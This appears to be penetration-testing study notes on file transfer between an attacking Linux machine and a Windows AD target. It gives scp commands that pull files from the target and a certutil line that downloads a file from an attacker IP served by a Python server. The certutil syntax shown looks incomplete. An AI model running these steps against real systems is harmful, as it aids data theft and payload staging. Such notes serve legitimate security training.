--- ---

<h2>PSCP & SCP</h2>

PSCP and SCP are command-line tools used to securely transfer files between computers. They are both based on the SSH (Secure Shell) protocol, which allows for secure and encrypted communication between systems.

PSCP is a Windows-based tool, while SCP is a Linux-based tool. Both tools can be used to transfer files from one system to another, and they have similar syntax.


<h2>Command</h2>

---> **From attacking Machine** (Linux) -> (Windows AD)

```Terminal
scp DOMAIN\\USER@MACHINE_DOMAIN_NAME:C:/User/USERNAME/.../FILE.SOMETHING ~/Documents/....
```

- First file destination           ---> File on the windows machine
- Second File Destination     ---> File output option on the second machine (~)



---> **From Target Machin**e (Windows) -> (Linux)

```
scp USER@IP:/User/USERNAME/Downloads/FILE.SOMETHING ~/Documents/....
```

- First file destination           ---> File on the windows machine
- Second File Destination     ---> File output option on the second machine (~)



---> From Attacking Machine (Linux) -> (Windows)

```
scp USER@IP:C:/.../FILE.SOMETHING .
```

- First file destination           ---> File on the windows machine
- Second File Destination     ---> File output option on the second machine (~)

---

<h2>Other Technique (WGET & Certutil)</h2>

An alternative method for sharing files is to use tools such as wget (on Linux) or certutil (on Windows), along with a Python server. This allows you to share files through these tools by using the Python server as a medium.

Wget is a command-line tool for Linux and other Unix-based operating systems that allows users to download files from the internet. It supports various protocols such as HTTP, HTTPS, and FTP, and allows for the retrieval of files from websites, servers, and other sources. It also supports the ability to download files recursively, meaning that it can follow links within a webpage and download all the files linked to it.

Linux
```
wget [URL of file to download] -P [path to save file]
```


Certutil is a command-line tool on Windows that allows users to manage digital certificates, including file and certificate services. It can be used to display, configure, and verify certification authority (CA) configuration information, configure Certificate Services, backup and restore CA components, and verify certificates, key pairs, and certificate chains. It can also be used to import and export certificate files, such as .cer and .pfx files.

Windows
```
certutil -f http://IP/Shared_file.XX New_File_Name.XX
```